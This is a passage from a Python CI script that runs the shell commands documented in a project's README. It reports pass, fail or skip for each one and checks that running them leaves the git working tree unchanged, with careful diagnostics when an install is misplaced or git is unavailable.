                    f"console script for {sys.executable} (expected {expected}).\n"
                    f"Refusing to report a green docs gate that tested a different "
                    f"installation.",
                    file=sys.stderr,
                )
                return 2

        # Guard 2: refuse to run against an editable install of this checkout.
        # See the comment above -- `toxindb demo` would regenerate fixtures
        # inside the repository, and it would do so silently.
        try:
            import toxindb as _pkg
        except ImportError:
            print("error: toxindb is not importable by this interpreter", file=sys.stderr)
            return 2
        pkg_dir = Path(_pkg.__file__).resolve().parent
        if _is_within(pkg_dir, repo_root):
            # The remedy differs by cause, and saying the wrong one sends the
            # reader in a circle. A virtualenv created *inside* the checkout
            # (`python3 -m venv .venv`) makes an otherwise-correct non-editable
            # install land back inside the repository, so telling them to drop
            # `-e` when they never used it is useless.
            venv_dirs = sorted(
                p.name
                for p in repo_root.iterdir()
                if p.is_dir() and (p / "pyvenv.cfg").is_file()
            ) if repo_root.is_dir() else []
            cause = (
                f"A virtualenv inside the checkout ({', '.join(venv_dirs)}) puts "
                f"site-packages back under the repository."
                if venv_dirs
                else "This is the signature of an editable install (`pip install -e .`)."
            )
            print(
                f"error: toxindb is loaded from {pkg_dir}, which is inside the "
                f"repository at {repo_root}.\n"
                f"`toxindb demo` regenerates its fixtures relative to the package "
                f"directory, so running the documented commands would write into "
                f"the checkout.\n"
                f"{cause}\n"
                f"Create the virtualenv outside the checkout (for example "
                f"`python3 -m venv /tmp/toxindb-docs-venv`) and run this check with "
                f"that interpreter.",
                file=sys.stderr,
            )
            return 2
        print(
            f"  note   toxindb loaded from {pkg_dir} (outside the checkout, so "
            f"fixture regeneration cannot dirty the tree)"
        )

        # Printed here rather than before the guards so that a guard's
        # diagnosis is the last thing on the screen, rather than a cheerful
        # "Checking 17 command(s)" followed immediately by a refusal to
        # check any of them.
        print(f"Checking {len(planned)} command(s) from {args.readme.name}\n")

        for line_no, command, steps, assignments, reason in planned:
            if reason is not None or steps is None:
                skipped += 1
                print(f"  SKIP  README.md:{line_no:<5} ({reason})")
                continue
            ran += 1
            # Captured per command, and compared against *this* command's own
            # prior state. Comparing every command against the run's starting
            # state instead would report the first leaker and then blame every
            # later command for a tree that was already dirty.
            tree_previous = _tree_state(repo_root)
            step_env = env
            if assignments:
                step_env = dict(env, **assignments)
            rc, output = 0, ""
            for position, (joiner, argv) in enumerate(steps):
                try:
                    # No shell, and the exit status is the program's own. With
                    # `shell=True` this returned the *shell's* status, so
                    # `toxindb nosuchsubcommand &` printed PASS and exited 0 --
                    # verified before the fix: rc=0 with the trailing `&`, rc=1
                    # without it.
                    completed = subprocess.run(
                        argv,
                        shell=False,
                        cwd=workdir,
                        env=step_env,
                        capture_output=True,
                        text=True,
                        timeout=TIMEOUT_SECONDS,
                    )
                except subprocess.TimeoutExpired:
                    rc, output = 124, f"timed out after {TIMEOUT_SECONDS}s"
                    break
                except FileNotFoundError as exc:
                    rc, output = 127, str(exc)
                    break
                rc = completed.returncode
                output += completed.stdout + completed.stderr
                if rc != 0:
                    # `a || b` runs b precisely because a failed, so the chain is
                    # only over once nothing is left to try. Everything else --
                    # `&&`, `;`, a single step -- stops here.
                    following = steps[position + 1:position + 2]
                    if not following or following[0][0] != "||":
                        break

            # Checked per command, not only at the end. The end-of-run assertion
            # below is what fails the job; this is what names the culprit, which
            # is the difference between a report a maintainer can act on and a
            # red job they have to bisect by hand.
            state_now = _tree_state(repo_root)
            if (
                tree_previous is not None
                and state_now is not None
                and state_now != tree_previous
            ):
                print(
                    f"  DIRTY README.md:{line_no:<5} {command}  "
                    f"(modified the working tree)"
                )
                for entry in _diff_lines(tree_previous, state_now):
                    if entry.startswith(("+", "-")) and not entry.startswith(
                        ("+++", "---")
                    ):
                        print(f"        | {entry}")
                dirty = True

            if rc == 0:
                print(f"  PASS  README.md:{line_no:<5} {command}")
            else:
                print(f"  FAIL  README.md:{line_no:<5} {command}  (exit {rc})")
                tail = [ln for ln in output.strip().splitlines() if ln.strip()][-5:]
                for line in tail:
                    print(f"        | {line}")
                failures.append((line_no, command, rc, output))

    print(f"\n{ran} command(s) executed, {skipped} skipped, {len(failures)} failed")

    # Floor on executed commands. A gate that executes nothing and reports
    # "0 failed" is indistinguishable from a green gate, and the most likely
    # cause is a README that stopped being parsed -- not a README that became
    # correct.
    if ran == 0:
        print(
            "::error::no documented command was executed. Either the README's "
            "shell examples have all become unrecognised, or the skip rules "
            "now reject every command. Both are failures, not passes.",
            file=sys.stderr,
        )
        return 1

    tree_after = _tree_state(repo_root)
    if tree_before is None or tree_after is None:
        print("  note   skipped the working-tree assertion (not a git checkout)")
    elif tree_before != tree_after:
        # This is the assertion that makes the "runs hermetically" claim above
        # verifiable. Guards 1 and 2 remove the two known ways the demo can
        # write into the checkout; this catches the ones nobody has thought of.
        print(
            "::error::running the documented commands modified the working tree",
            file=sys.stderr,
        )
        for line in _diff_lines(tree_before, tree_after):
            print(f"  {line}", file=sys.stderr)
        return 1
    elif dirty:
        # Unreachable while the comparison above is exact, but kept so the
        # per-command report and the exit code cannot disagree.
        print("::error::a documented command modified the working tree", file=sys.stderr)
        return 1

    if failures:
        print(
            "\nThe README documents commands that do not run. Either fix the "
            "documented\ncommand, or if the example needs a real input file, "
            "point it at one that\nships in the repository.",
            file=sys.stderr,
        )
        return 1
    return 1 if unterminated else 0


def main() -> int:
    """`main` with a diagnosis for a missing `git` binary.

    `_tree_state` raises `GitUnavailable` rather than returning None, because
    "not a checkout" and "git is not installed" must not be confused: the first
    is a legitimate reason to skip the tree assertion with a note, the second
    means the assertion cannot run at all and the gate would otherwise report a
    green result with the safety net quietly removed. Verified: with `git`
    absent from `PATH` the check now exits 2 and says why, instead of escaping
    as an uncaught `FileNotFoundError` traceback (finding: `git` missing was an
    uncaught crash, not a diagnosis).
    """
    try:
        return _main()
    except GitUnavailable as exc:
        print(
            f"error: `git` could not be run ({exc}), so this check cannot verify "
            f"that the documented commands left the working tree alone. Install "
            f"git, or delete this job -- silently dropping the check would be "
            f"worse than the failure.",
            file=sys.stderr,
        )
        return 2
    except GitRefused as exc:
        print(
            f"error: {exc}. This check cannot verify that the documented "
            f"commands left the working tree alone, and reporting success "
            f"without that evidence would be claiming more than it checked. "
            f"Repair the checkout (`git status` in it should work) and re-run.",
            file=sys.stderr,
        )
        return 2


if __name__ == "__main__":
    sys.exit(main())
